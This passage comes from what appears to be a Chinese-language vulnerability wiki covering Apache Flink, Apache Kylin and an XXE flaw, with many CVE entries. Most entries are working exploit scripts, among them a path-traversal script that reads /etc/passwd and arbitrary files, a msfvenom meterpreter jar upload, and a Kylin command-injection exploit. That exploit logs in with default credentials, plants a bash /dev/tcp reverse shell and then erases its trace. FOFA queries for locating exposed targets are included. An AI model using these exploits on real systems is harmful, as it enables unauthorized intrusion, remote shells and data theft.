print('+------------------------------------------') def POC_1(target_url): vuln_url = target_url + \"/v2/api/product/manger/getInfo\" data = \"\"\" ]> John &ent; \"\"\" headers = { \"User-Agent\": \"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\", \"Content-type\": \"text/xml\" } response = requests.request(\"POST\", url=vuln_url, data=data, headers=headers, timeout=20) if \"/bin/bash\" in response.text: print(\"\\033[32m[o] 含有CVE-2020-11991漏洞，响应为{}\\033[0m\".format(response.text)) else: print(\"\\033[31m[x] 漏洞利用失败 \\033[0m\") if __name__ == '__main__': title() target_url = str(input(\"\\033[35mPlease input Attack Url\\nUrl >>> \\033[0m\")) POC_1(target_url) 稻草人安全漏洞库 all right reserved，powered by Gitbook文件更新时间： 2021-07-21 13:48:08 "},"book/Web服务器漏洞/Apache/Apache Flink/":{"url":"book/Web服务器漏洞/Apache/Apache Flink/","title":"Apache Flink ","keywords":"","body":"Apache Flink Apache Flink Apache Flink 目录遍历漏洞 CVE-2020-17519 稻草人安全漏洞库 all right reserved，powered by Gitbook文件更新时间： 2021-07-21 13:48:08 "},"book/Web服务器漏洞/Apache/Apache Flink/Apache Flink 小于1.9.1远程代码执行 CVE-2020-17518.html":{"url":"book/Web服务器漏洞/Apache/Apache Flink/Apache Flink 小于1.9.1远程代码执行 CVE-2020-17518.html","title":"Apache Flink 小于1.9.1远程代码执行 CVE-2020-17518","keywords":"","body":"Apache Flink 漏洞描述 近日,有安全研究员公开了一个Apache Flink的任意Jar包上传导致远程代码执行的漏洞. 漏洞影响 [!NOTE] Apache Flink FOFA FOFA 语句 app=\"Apache-Flink\" && country=\"CN\" 国内还是很多使用 Apache Flink 的，大概有1000的数量左右 漏洞复现 打开一个使用 Apache Flink 的网站，打开后页面为这样子 点击查看文件上传页面 打开MSF 生成一个 jar 木马 msfvenom -p java/meterpreter/reverse_tcp LHOST=xxx.xxx.xxx.xxx LPORT=4444 -f jar > test.jar 点击 Add 上传 jar 文件 监听端口 msf6 > use exploit/multi/handler [*] Using configured payload generic/shell_reverse_tcp msf6 exploit(multi/handler) > set payload java/shell/reverse_tcp payload => java/shell/reverse_tcp msf6 exploit(multi/handler) > set lhost xxx.xxx.xxx.xxx lhost => xxx.xxx.xxx.xxx msf6 exploit(multi/handler) > set lport 4444 lport => 4444 msf6 exploit(multi/handler) > run 点击下 submit 反弹回来一个root 权限shell 漏洞检测POC import requests def title(): print('+------------------------------------------') print('+ \\033[34mPOC_Des: http://wiki.peiqi.tech \\033[0m') print('+ \\033[34mGithub : https://github.com/PeiQi0 \\033[0m') print('+ \\033[34m公众号 : PeiQi文库 \\033[0m') print('+ \\033[34mVersion: Apache Flink >> http://xxx.xxx.xxx.xxx:9999 \\033[0m') print('+------------------------------------------') def POC_1(target_url): vuln_url = target_url + \"/jars/upload\" headers = { \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\" } try: response = requests.get(url=vuln_url, headers=headers, timeout=20) if \"Unable to load requested file /jars/upload.\" in response.text: print(\"\\033[32m[o] 可能存在 Apache Flink >> \\033[0m\")) POC_1(target_url) 稻草人安全漏洞库 all right reserved，powered by Gitbook文件更新时间： 2021-07-21 13:48:08 "},"book/Web服务器漏洞/Apache/Apache Flink/Apache Flink 目录遍历漏洞 CVE-2020-17519.html":{"url":"book/Web服务器漏洞/Apache/Apache Flink/Apache Flink 目录遍历漏洞 CVE-2020-17519.html","title":"Apache Flink 目录遍历漏洞 CVE-2020-17519","keywords":"","body":"Apache Flink 目录遍历漏洞 CVE-2020-17519 漏洞描述 2021年01月06日，360CERT监测发现Apache Flink发布了Apache Flink 目录穿越漏洞,目录穿越漏洞的风险通告，漏洞编号为CVE-2020-17518,CVE-2020-17519，漏洞等级：高危，漏洞评分：8.5。 远程攻击者通过REST API目录遍历，可造成文件读取/写入的影响。 漏洞影响 [!NOTE] Apache Flink 1.11.0 Apache Flink 1.11.1 Apache Flink 1.11.2 FOFA [!NOTE] app=\"Apache Flink\" 环境搭建 https://github.com/vulhub/vulhub/tree/master/flink/CVE-2020-17519 漏洞复现 POC: http://xxx.xxx.xxx.xxx/jobmanager/logs/..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252fetc%252fpasswd 漏洞利用POC import requests import sys import json from requests.packages.urllib3.exceptions import InsecureRequestWarning def title(): print('+------------------------------------------') print('+ \\033[34mPOC_Des: http://wiki.peiqi.tech \\033[0m') print('+ \\033[34mGithub : https://github.com/PeiQi0 \\033[0m') print('+ \\033[34m公众号 : PeiQi文库 \\033[0m') print('+ \\033[34mVersion: Apache Flink 1.11.0-1.11.2 \\033[0m') print('+ \\033[36m使用格式: python3 CVE-2020-17519.py \\033[0m') print('+ \\033[36mUrl >>> http://xxx.xxx.xxx.xxx \\033[0m') print('+ \\033[36mFile >>> /etc/passwd \\033[0m') print('+------------------------------------------') def POC_1(target_url, file_name): file_name = file_name.replace(\"/\", \"%252f\") vuln_url = target_url + \"/jobmanager/logs/..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..{}\".format(file_name) headers = { \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\", } try: requests.packages.urllib3.disable_warnings(InsecureRequestWarning) response = requests.get(url=vuln_url, timeout=10, verify=False, headers=headers) print(\"\\033[32m[o] 请求URL ： {}\\033[0m\".format(vuln_url)) if \"root\" in response.text: print(\"\\033[32m[o] 目标 {} 存在漏洞,成功读取 /etc/passwd ，响应为:\\n{}\\033[0m\".format(target_url, response.text)) else : print(\"\\033[31m[x] 目标Url漏洞利用失败\\033[0m\") sys.exit(0) except Exception as e: print(\"\\033[31m[x] 目标Url漏洞利用失败\\033[0m\") sys.exit(0) def POC_2(target_url, file_name): file_name_re = file_name.replace(\"/\", \"%252f\") vuln_url = target_url + \"/jobmanager/logs/..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..{}\".format(file_name_re) headers = { \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\", } try: requests.packages.urllib3.disable_warnings(InsecureRequestWarning) response = requests.get(url=vuln_url, timeout=10, verify=False, headers=headers) print(\"\\033[32m[o] 请求URL ： {}\\033[0m\".format(vuln_url)) if \"error\" not in response.text: print(\"\\033[32m[o] 目标 {} 存在漏洞,成功读取 {} ，响应为:\\n{}\\033[0m\".format(target_url, file_name, response.text)) else : print(\"\\033[31m[x] 目标文件{}读取失败\\033[0m\".format(file_name)) except Exception as e: print(\"\\033[31m[x] 目标Url漏洞利用失败\\033[0m\") sys.exit(0) if __name__ == '__main__': title() target_url = str(input(\"\\033[35mPlease input Attack Url\\nUrl >>> \\033[0m\")) file_name = \"/etc/passwd\" POC_1(target_url, file_name) while True: file_name = input(\"\\033[35mFile >>> \\033[0m\") if file_name == \"exit\": sys.exit(0) else: POC_2(target_url, file_name) 稻草人安全漏洞库 all right reserved，powered by Gitbook文件更新时间： 2021-07-21 13:48:08 "},"book/Web服务器漏洞/Apache/Apache Kylin/":{"url":"book/Web服务器漏洞/Apache/Apache Kylin/","title":"Apache Kylin","keywords":"","body":"Apache Kylin Apache Kylin Console 控制台弱口令 Apache kylin 未授权配置泄露 CVE-2020-13937 Apache Kylin 命令注入漏洞 CVE-2020-1956 Apache Kylin 命令注入漏洞 CVE-2020-13925 稻草人安全漏洞库 all right reserved，powered by Gitbook文件更新时间： 2021-07-21 13:48:08 "},"book/Web服务器漏洞/Apache/Apache Kylin/Apache Kylin Console 控制台弱口令.html":{"url":"book/Web服务器漏洞/Apache/Apache Kylin/Apache Kylin Console 控制台弱口令.html","title":"Apache Kylin Console 控制台弱口令","keywords":"","body":"Apache Kylin Console 控制台弱口令 漏洞描述 Apache Kylin Console 控制台存在默认弱口令 admin：KYLIN，可被登录控制台进一步利用其他漏洞 漏洞影响 [!NOTE] Apache Kylin 漏洞复现 打开后目标站点使用默认账号密码admin/KYLIN登录，出现初始界面即为成功 Goby & POC [!NOTE] 已上传 https://github.com/PeiQi0/PeiQi-WIKI-POC Goby & POC 目录中 Apache_Kylin_Console_Default_password.json 稻草人安全漏洞库 all right reserved，powered by Gitbook文件更新时间： 2021-07-21 13:48:08 "},"book/Web服务器漏洞/Apache/Apache Kylin/Apache Kylin 未授权配置泄露 CVE-2020-13937.html":{"url":"book/Web服务器漏洞/Apache/Apache Kylin/Apache Kylin 未授权配置泄露 CVE-2020-13937.html","title":"Apache Kylin 未授权配置泄露 CVE-2020-13937","keywords":"","body":"Apache Kylin的未授权配置泄露 CVE-2020-13937 漏洞描述 Apache Kylin有一个restful api会在没有任何认证的情况下暴露配置信息。 FOFA [!NOTE] app=\"APACHE-kylin\" 漏洞影响 [!NOTE] Apahche Kylin 2.x.x Apahche Kylin Apahche Kylin 4.0.0-alpha 漏洞复现 根据漏洞情报 漏洞利用POC为 http://xxx.xxx.xxx.xxx/kylin/api/admin/config 漏洞检测POC import requests def title(): print('+------------------------------------------') print('+ \\033[34mPOC_Des: http://wiki.peiqi.tech \\033[0m') print('+ \\033[34mGithub : https://github.com/PeiQi0 \\033[0m') print('+ \\033[34m公众号 : PeiQi文库 \\033[0m') print('+ \\033[34mVersion: Apache Kylin 2.x.x >> http://xxx.xxx.xxx.xxx:9999 \\033[0m') print('+------------------------------------------') def POC_1(target_url): vuln_url = target_url + \"/kylin/api/admin/config\" headers = { \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\" } try: response = requests.get(url=vuln_url, headers=headers, timeout=20) if \"config\" in response.text: print(\"\\033[32m[o] 存在Apache Kylin的未授权配置泄露\\n[o] 响应为:\\n\\033[0m\",response.text) else: print(\"\\033[31m[x] 目标Url漏洞利用失败\\033[0m\") except: print(\"\\033[31m[x] 目标Url漏洞利用失败\\033[0m\") if __name__ == '__main__': title() target_url = str(input(\"\\033[35mPlease input Attack Url\\nUrl >>> \\033[0m\")) POC_1(target_url) Goby && POC [!NOTE] 已上传 https://github.com/PeiQi0/PeiQi-WIKI-POC Goby & POC 目录中 Apache_Kylin_Unauthorized_configuration_disclosure.json 参考 CVE-2020-13937|Apache Kylin的未授权配置泄露漏洞，腾讯安全全面支持检测 稻草人安全漏洞库 all right reserved，powered by Gitbook文件更新时间： 2021-07-21 13:48:08 "},"book/Web服务器漏洞/Apache/Apache Kylin/Apache Kylin 命令注入漏洞 CVE-2020-1956.html":{"url":"book/Web服务器漏洞/Apache/Apache Kylin/Apache Kylin 命令注入漏洞 CVE-2020-1956.html","title":"Apache Kylin 命令注入漏洞 CVE-2020-1956","keywords":"","body":"Apache Kylin 命令注入漏洞 CVE-2020-1956 漏洞描述 2020年5月22日，CNVD 通报了 Apache Kylin 存在命令注入漏洞 CVE-2020-1956，地址在 http://www.cnnvd.org.cn/web/xxk/ldxqById.tag?CNNVD=CNNVD-202005-1133 。 Apache Kylin 是美国 Apache 软件基金会的一款开源的分布式分析型数据仓库。该产品主要提供 Hadoop/Spark 之上的 SQL 查询接口及多维分析（OLAP**）等功能。 影响版本 [!NOTE] Apache Kylin 2.3.0 ~ 2.3.2 Apache Kylin 2.4.0 ~ 2.4.1 Apache Kylin 2.5.0 ~ 2.5.2 Apache Kylin 2.6.0 ~ 2.6.5 Apache Kylin 3.0.0-alpha, Apache Kylin 3.0.0-alpha2, Apache Kylin 3.0.0-beta, Apache Kylin 3.0.0, Kylin 3.0.1 环境搭建 这里使用 docker 来搭建需要的环境 Kylin官方文档 docker pull apachekylin/apache-kylin-standalone:3.0.1 [!NOTE] 如果服务器内存较小，可不选择 -m 8G 参数 docker run -d \\ -m 8G \\ -p 7070:7070 \\ -p 8088:8088 \\ -p 50070:50070 \\ -p 8032:8032 \\ -p 8042:8042 \\ -p 16010:16010 \\ apachekylin/apache-kylin-standalone:3.0.1 打开后使用默认账号密码admin/KYLIN登录，出现初始界面即为成功 漏洞分析 查看这个漏洞修复的补丁 查看地址 这里可以看到此漏洞有关的参数有三个，分别是 srcCfgUri、dstCfgUri、projectName，相关的函数为 migrateCube 官方文档中对 migrateCube 的描述 POST /kylin/api/cubes/{cube}/{project}/migrate 下载 Apache Kylin 3.0.1 的源代码进行代码审计,出现漏洞函数的文件为以下路径 apache-kylin-3.0.1\\server-base\\src\\main\\java\\org\\apache\\kylin\\rest\\service\\CubeService.java 找到migrateCube函数 @PreAuthorize(Constant.ACCESS_HAS_ROLE_ADMIN + \" or hasPermission(#cube, 'ADMINISTRATION') or hasPermission(#cube, 'MANAGEMENT')\") public void migrateCube(CubeInstance cube, String projectName) { KylinConfig config = cube.getConfig(); if (!config.isAllowAutoMigrateCube()) { throw new InternalErrorException(\"One click migration is disabled, please contact your ADMIN\"); } for (CubeSegment segment : cube.getSegments()) { if (segment.getStatus() != SegmentStatusEnum.READY) { throw new InternalErrorException( \"At least one segment is not in READY state. Please check whether there are Running or Error jobs.\"); } } String srcCfgUri = config.getAutoMigrateCubeSrcConfig(); String dstCfgUri = config.getAutoMigrateCubeDestConfig(); Preconditions.checkArgument(StringUtils.isNotEmpty(srcCfgUri), \"Source configuration should not be empty.\"); Preconditions.checkArgument(StringUtils.isNotEmpty(dstCfgUri), \"Destination configuration should not be empty.\"); String stringBuilderstringBuilder = (\"%s/bin/kylin.sh org.apache.kylin.tool.CubeMigrationCLI %s %s %s %s %s %s true true\"); String cmd = String.format(Locale.ROOT, stringBuilder, KylinConfig.getKylinHome(), srcCfgUri, dstCfgUri, cube.getName(), projectName, config.isAutoMigrateCubeCopyAcl(), config.isAutoMigrateCubePurge()); logger.info(\"One click migration cmd: \" + cmd); CliCommandExecutor exec = new CliCommandExecutor(); PatternedLogger patternedLogger = new PatternedLogger(logger); try { exec.execute(cmd, patternedLogger); } catch (IOException e) { throw new InternalErrorException(\"Failed to perform one-click migrating\", e); } } PreAuthorize里面定义了路由权限，ADMIN权限、ADMINISTRATION权限和MANAGEMENT权限可以访问该service。 @PreAuthorize(Constant.ACCESS_HAS_ROLE_ADMIN + \" or hasPermission(#cube, 'ADMINISTRATION') or hasPermission(#cube, 'MANAGEMENT')\") 在1087行判断是否开启了MigrateCube设置，如果没有开启则会报错 跟进 isAllowAutoMigrateCube() 这个函数 可以看到这里默认的配置kylin.tool.auto-migrate-cube.enabled 就是Flase public boolean isAllowAutoMigrateCube() { return Boolean.parseBoolean(getOptional(\"kylin.tool.auto-migrate-cube.enabled\", FALSE)); } 在没有开启配置kylin.tool.auto-migrate-cube.enabled为true的情况下，调用MigrateCube则会出现报错 通过Apache Kylin的SYSTEM模块开启kylin.tool.auto-migrate-cube.enabled为True 设置后再去请求则不会出现刚刚的报错，而是出现Source configuration should not be empty 跟进出现报错语句的代码块 String srcCfgUri = config.getAutoMigrateCubeSrcConfig(); String dstCfgUri = config.getAutoMigrateCubeDestConfig(); Preconditions.checkArgument(StringUtils.isNotEmpty(srcCfgUri), \"Source configuration should not be empty.\"); Preconditions.checkArgument(StringUtils.isNotEmpty(dstCfgUri), \"Destination configuration should not be empty.\"); 这里进行了对kylin.tool.auto-migrate-cube.src-config和kylin.tool.auto-migrate-cube.dest-config的配置进行了检测 ,如果为空则会出现刚刚的报错 跟进 getAutoMigrateCubeSrcConfig()和getAutoMigrateCubeDestConfig()函数 public String getAutoMigrateCubeSrcConfig() { return getOptional(\"kylin.tool.auto-migrate-cube.src-config\", \"\"); } public String getAutoMigrateCubeDestConfig() { return getOptional(\"kylin.tool.auto-migrate-cube.dest-config\", \"\"); } 发现这两个配置默认为空，因为配置允许自定义，所以srcCfgUri和dstCfgUri两个变量均是可控的 继续向下走，发现一处命令拼接 String stringBuilder = (\"%s/bin/kylin.sh org.apache.kylin.tool.CubeMigrationCLI %s %s %s %s %s %s true true\"); String cmd = String.format(Locale.ROOT, stringBuilder, KylinConfig.getKylinHome(), srcCfgUri, dstCfgUri, cube.getName(), projectName, config.isAutoMigrateCubeCopyAcl(), config.isAutoMigrateCubePurge()); logger.info(\"One click migration cmd: \" + cmd); CliCommandExecutor exec = new CliCommandExecutor(); PatternedLogger patternedLogger = new PatternedLogger(logger); try { exec.execute(cmd, patternedLogger); } catch (IOException e) { throw new InternalErrorException(\"Failed to perform one-click migrating\", e); } } 进入到execute函数 private Pair runRemoteCommand(String command, Logger logAppender) throws IOException { SSHClient ssh = new SSHClient(remoteHost, port, remoteUser, remotePwd); SSHClientOutput sshOutput; try { sshOutput = ssh.execCommand(command, remoteTimeoutSeconds, logAppender); int exitCode = sshOutput.getExitCode(); String output = sshOutput.getText(); return Pair.newPair(exitCode, output); } catch (IOException e) { throw e; } catch (Exception e) { throw new IOException(e.getMessage(), e); } } private Pair runNativeCommand(String command, Logger logAppender) throws IOException { String[] cmd = new String[3]; String osName = System.getProperty(\"os.name\"); if (osName.startsWith(\"Windows\")) { cmd[0] = \"cmd.exe\"; cmd[1] = \"/C\"; } else { cmd[0] = \"/bin/bash\"; cmd[1] = \"-c\"; } cmd[2] = command; ProcessBuilder builder = new ProcessBuilder(cmd); builder.redirectErrorStream(true); Process proc = builder.start(); BufferedReader reader = new BufferedReader( new InputStreamReader(proc.getInputStream(), StandardCharsets.UTF_8)); String line; StringBuilder result = new StringBuilder(); while ((line = reader.readLine()) != null && !Thread.currentThread().isInterrupted()) { result.append(line).append('\\n'); if (logAppender != null) { logAppender.log(line); } } if (Thread.interrupted()) { logger.info(\"CliCommandExecutor is interruppted by other, kill the sub process: \" + command); proc.destroy(); try { Thread.sleep(1000); } catch (InterruptedException e) { // do nothing } return Pair.newPair(1, \"Killed\"); } try { int exitCode = proc.waitFor(); return Pair.newPair(exitCode, result.toString()); } catch (InterruptedException e) { Thread.currentThread().interrupt(); throw new IOException(e); } } } 由此可以得出我们可以通过这两个可控的参数，执行任意我们需要的命令，例如反弹一个shell，设置的配置为 [!NOTE] kylin.tool.auto-migrate-cube.enabled=true kylin.tool.auto-migrate-cube.src-config=echo;bash -i >& /dev/tcp/xxx.xxx.xxx.xxx/9999 0>&1 kylin.tool.auto-migrate-cube.dest-config=shell 再去发送POST请求 /kylin/api/cubes/kylin_sales_cube/learn_kylin/migrate 成功反弹一个shell 漏洞利用POC [!NOTE] POC利用前提是拥有账号密码，默认账号密码是 admin/KYLIN #!/usr/bin/python3 #-*- coding:utf-8 -*- # author : PeiQi # from : http://wiki.peiqi.tech import requests import base64 import sys def title(): print('+------------------------------------------') print('+ \\033[34mPOC_Des: http://wiki.peiqi.tech \\033[0m') print('+ \\033[34mGithub : https://github.com/PeiQi0 \\033[0m') print('+ \\033[34m公众号 : PeiQi文库 \\033[0m') print('+ \\033[34mVersion: Apache Kylin >> http://xxx.xxx.xxx.xxx:7070 \\033[0m') print('+ \\033[36mLogin >>> admin:KYLIN(格式为User:Pass) \\033[0m') print('+------------------------------------------') def POC_1(target_url): login_url = target_url + \"/kylin/api/user/authentication\" user_pass = str(input(\"\\033[35mPlease input User and Pass\\nLogin >>> \\033[0m\")) Authorization = \"Basic \" + str((base64.b64encode(user_pass.encode('utf-8'))),'utf-8') headers = { \"User-Agent\": \"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\", \"Authorization\": Authorization, \"Cookie\": \"project=null\" } try: response = requests.post(url=login_url, headers=headers, timeout=20) if \"password\" not in response.text: print(\"\\033[31m[x] 账号密码出现错误 \\033[0m\") sys.exit(0) else: print(\"\\033[32m[o] 成功登录，获得JSESSIONID：\" + response.cookies[\"JSESSIONID\"] + \"\\033[0m\") return response.cookies[\"JSESSIONID\"],Authorization except: print(\"\\033[31m[x] 漏洞利用失败\\033[0m\") sys.exit(0) def POC_2(target_url, cookie, IP, PORT, Authorization): config_url = target_url + \"/kylin/api/admin/config\" key = [\"kylin.tool.auto-migrate-cube.enabled\",\"kylin.tool.auto-migrate-cube.src-config\",\"kylin.tool.auto-migrate-cube.dest-config\"] value = [\"true\",\"echo;bash -i >& /dev/tcp/{}/{} 0>&1;echo\".format(IP, PORT), \"shell\"] headers = { \"User-Agent\": \"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\", \"Authorization\": Authorization, \"Accept\": \"application/json, text/plain, */*\", \"Content-Type\": \"application/json;charset=UTF-8\", \"Pragma\": \"no-cache\", \"Cookie\": \"project=null;JSESSIONID=\"+cookie } for i in range(0,3): data = \"\"\"{\"key\":\"%s\",\"value\":\"%s\"}\"\"\" % (key[i], value[i]) try: response = requests.put(url=config_url, headers=headers, data=data, timeout=20) if response.status_code == 200: print(\"\\033[32m[o] 成功将\" + key[i] +\"设置为\" + value[i] +\"\\033[0m\") else: print(\"\\033[31m[x] 设置\" + key[i] +\"为\" + value[i] +\"失败\\033[0m\") sys.exit(0) except: print(\"\\033[31m[x] 漏洞利用失败 \\033[0m\") sys.exit(0) def POC_3(target_url, cookie): print(\"\\033[35m[o] 正在反弹shell......\\033[0m\") vuln_url = target_url + \"/kylin/api/cubes/kylin_sales_cube/learn_kylin/migrate\" headers = { \"User-Agent\": \"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\", \"Cookie\": \"project=null;JSESSIONID=\" + cookie } try: response = requests.post(url=vuln_url, headers=headers) POC_4(target_url, cookie) except: print(\"\\033[31m[x] 漏洞利用失败 \\033[0m\") sys.exit(0) def POC_4(target_url, cookie): config_url = target_url + \"/kylin/api/admin/config\" key = [\"kylin.tool.auto-migrate-cube.enabled\", \"kylin.tool.auto-migrate-cube.src-config\", \"kylin.tool.auto-migrate-cube.dest-config\"] value = [\"flase\", \"echo;echo;echo\", \"None\"] headers = { \"User-Agent\": \"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\", \"Authorization\": Authorization, \"Accept\": \"application/json, text/plain, */*\", \"Content-Type\": \"application/json;charset=UTF-8\", \"Pragma\": \"no-cache\", \"Cookie\": \"project=null;JSESSIONID=\" + cookie } for i in range(0,3): data = \"\"\"{\"key\":\"%s\",\"value\":\"%s\"}\"\"\" % (key[i], value[i]) try: response = requests.put(url=config_url, headers=headers, data=data, timeout=20) if response.status_code == 200: print(\"\\033[32m[o] 成功将\" + key[i] +\"设置为\" + value[i] +\"\\033[0m\") else: print(\"\\033[31m[x] 设置\" + key[i] +\"为\" + value[i] +\"失败\\033[0m\") sys.exit(0) except: print(\"\\033[31m[x] 漏洞利用失败 \\033[0m\") sys.exit(0) print(\"\\033[35m[o] 成功清理痕迹\\033[0m\") if __name__ == '__main__': title() target_url = str(input(\"\\033[35mPlease input Attack Url\\nUrl >>> \\033[0m\")) try: cookie,Authorization = POC_1(target_url) except: print(\"\\033[31m[x] 漏洞利用失败 \\033[0m\") sys.exit(0) IP = str(input(\"\\033[35m请输入监听IP >>> \\033[0m\")) PORT = str(input(\"\\033[35m请输入监听PORT >>> \\033[0m\")) POC_2(target_url, cookie, IP, PORT, Authorization) POC_3(target_url, cookie) 参考文章 Apache Kylin 命令注入漏洞 CVE-2020-1956 POC 分析 稻草人安全漏洞库 all right reserved，powered by Gitbook文件更新时间： 2021-07-21 13:48:08 "},"book/Web服务器漏洞/Apache/Apache Kylin/Apache Kylin 命令注入漏洞 CVE-2020-13925.html":{"url":"book/Web服务器漏洞/Apache/Apache Kylin/Apache Kylin 命令注入漏洞 CVE-2020-13925.html","title":"Apache Kylin 命令注入漏洞 CVE-2020-13925","keywords":"","body":"Apache Kylin 命令注入漏洞 CVE-2020-13925 漏洞描述 6月，京东安全的蓝军团队发现了一个 apache kylin 远程命令执行严重漏洞（ CVE-2020-13925）。黑客可以利用这个漏洞，登录任何管理员账号和密码默认未修改的账号，获得管理员权限。由于Apache Kylin被广泛应用于企业的大数据分析平台，因此该漏洞将对企业核心数据具有较大的危害，存在数据泄露风险，建议用户尽快升级软件至安全版本。 影响版本 [!NOTE] Apache Kylin 2.3.0 ~ 2.3.2 Apache Kylin 2.4.0 ~ 2.4.1 Apache Kylin 2.5.0 ~ 2.5.2 Apache Kylin 2.6.0 ~ 2.6.5 Apache Kylin 3.0.0-alpha, Apache Kylin 3.0.0-alpha2, Apache Kylin 3.0.0-beta, Apache Kylin 3.0.0, Kylin 3.0.1,Kylin 3.0.2 环境搭建 这里使用 docker 来搭建需要的环境 Kylin官方文档 docker pull apachekylin/apache-kylin-standalone:3.0.1 [!NOTE] 如果服务器内存较小，可不选择 -m 8G 参数 docker run -d \\ -m 8G \\ -p 7070:7070 \\ -p 8088:8088 \\ -p 50070:50070 \\ -p 8032:8032 \\ -p 8042:8042 \\ -p 16010:16010 \\ apachekylin/apache-kylin-standalone:3.0.1 打开后使用默认账号密码admin/KYLIN登录，出现初始界面即为成功 漏洞复现 出现漏洞的代码文件在server-base/src/main/java/org/apache/kylin/rest/controller/DiagnosisController.java /** * Get diagnosis information for project */ @RequestMapping(value = \"/project/{project}/download\", method = { RequestMethod.GET }, produces = { \"application/json\" }) @ResponseBody public void dumpProjectDiagnosisInfo(@PathVariable String project, final HttpServletRequest request, final HttpServletResponse response) { try (AutoDeleteDirectory diagDir = new AutoDeleteDirectory(\"diag_project\", \"\")) { String filePath = dgService.dumpProjectDiagnosisInfo(project, diagDir.getFile()); setDownloadResponse(filePath, response); } catch (IOException e) { throw new InternalErrorException(\"Failed to dump project diagnosis info. \" + e.getMessage(), e); } } 这里可以看到 {project}参数是用户可控的变量，向下跟进dumpProjectDiagnosisInfo函数 public String dumpProjectDiagnosisInfo(String project, File exportPath) throws IOException { aclEvaluate.checkProjectOperationPermission(project); String[] args = { project, exportPath.getAbsolutePath() }; runDiagnosisCLI(args); return getDiagnosisPackageName(exportPath); } 首先通过checkProjectOperationPermission函数来检查该project是否许可，然后构建一个args的字符串数组，看一下checkProjectOperationPermission函数 public void checkProjectOperationPermission(String projectName) { ProjectInstance projectInstance = getProjectInstance(projectName); aclUtil.hasProjectOperationPermission(projectInstance); } 这里传入projectName，然后通过getProjectInstance来获取项目实例,跟进getProjectInstance private ProjectInstance getProjectInstance(String projectName) { return ProjectManager.getInstance(KylinConfig.getInstanceFromEnv()).getProject(projectName); } 因为 projectName 会被我们替换掉，所以不会获得一个正确的projectName,则会返回一个Null，查看下hasProjectOperationPermission函数 @PreAuthorize(Constant.ACCESS_HAS_ROLE_ADMIN + \" or hasPermission(#project, 'ADMINISTRATION')\" + \" or hasPermission(#project, 'MANAGEMENT')\" + \" or hasPermission(#project, 'OPERATION')\") public boolean hasProjectOperationPermission(ProjectInstance project) { return true; } 这里并没有对projectName进行检验，只对用户身份进行了检验，当为ADMIN、ADMINISTRATION、MANAGEMENT、OPERATION等权限，该值默认返回为true，回到 dumpProjectDiagnosisInfo函数，向下继续跟进runDiagnosisCLI函数 private void runDiagnosisCLI(String[] args) throws IOException { Message msg = MsgPicker.getMsg(); File cwd = new File(\"\"); logger.debug(\"Current path: \" + cwd.getAbsolutePath()); logger.debug(\"DiagnosisInfoCLI args: \" + Arrays.toString(args)); File script = new File(KylinConfig.getKylinHome() + File.separator + \"bin\", \"diag.sh\"); if (!script.exists()) { throw new BadRequestException( String.format(Locale.ROOT, msg.getDIAG_NOT_FOUND(), script.getAbsolutePath())); } String diagCmd = script.getAbsolutePath() + \" \" + StringUtils.join(args, \" \"); CliCommandExecutor executor = KylinConfig.getInstanceFromEnv().getCliCommandExecutor(); Pair cmdOutput = executor.execute(diagCmd); if (cmdOutput.getFirst() != 0) { throw new BadRequestException(msg.getGENERATE_DIAG_PACKAGE_FAIL()); } } 注意看这几行代码 String diagCmd = script.getAbsolutePath() + \" \" + StringUtils.join(args, \" \"); CliCommandExecutor executor = KylinConfig.getInstanceFromEnv().getCliCommandExecutor(); Pair cmdOutput = executor.execute(diagCmd); 与 Apache Kylin 命令注入漏洞 CVE-2020-1956 类似，同样也是经过execute函数，而digCmd同样也是经过了命令拼接 private Pair runRemoteCommand(String command, Logger logAppender) throws IOException { SSHClient ssh = new SSHClient(remoteHost, port, remoteUser, remotePwd); SSHClientOutput sshOutput; try { sshOutput = ssh.execCommand(command, remoteTimeoutSeconds, logAppender); int exitCode = sshOutput.getExitCode(); String output = sshOutput.getText(); return Pair.newPair(exitCode, output); } catch (IOException e) { throw e; } catch (Exception e) { throw new IOException(e.getMessage(), e); } } private Pair runNativeCommand(String command, Logger logAppender) throws IOException { String[] cmd = new String[3]; String osName = System.getProperty(\"os.name\"); if (osName.startsWith(\"Windows\")) { cmd[0] = \"cmd.exe\"; cmd[1] = \"/C\"; } else { cmd[0] = \"/bin/bash\"; cmd[1] = \"-c\"; } cmd[2] = command; ProcessBuilder builder = new ProcessBuilder(cmd); builder.redirectErrorStream(true); Process proc = builder.start(); BufferedReader reader = new BufferedReader( new InputStreamReader(proc.getInputStream(), StandardCharsets.UTF_8)); String line; StringBuilder result = new StringBuilder(); while ((line = reader.readLine()) != null && !Thread.currentThread().isInterrupted()) { result.append(line).append('\\n'); if (logAppender != null) { logAppender.log(line); } } if (Thread.interrupted()) { logger.info(\"CliCommandExecutor is interruppted by other, kill the sub process: \" + command); proc.destroy(); try { Thread.sleep(1000); } catch (InterruptedException e) { // do nothing } return Pair.newPair(1, \"Killed\"); } try { int exitCode = proc.waitFor(); return Pair.newPair(exitCode, result.toString()); } catch 